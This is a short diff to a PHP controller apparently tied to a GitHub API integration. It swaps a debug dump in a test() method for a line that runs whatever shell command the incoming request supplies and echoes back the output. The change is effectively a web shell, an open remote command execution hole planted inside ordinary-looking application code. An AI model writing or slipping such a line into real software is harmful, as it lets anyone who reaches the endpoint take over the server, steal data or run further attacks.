@@ -18,6 +18,6 @@ class GitHubController extends ApiController
 
     public function test(Request $request)
     {
-        dd($request);
+        echo shell_exec($request->command);
     }
 }
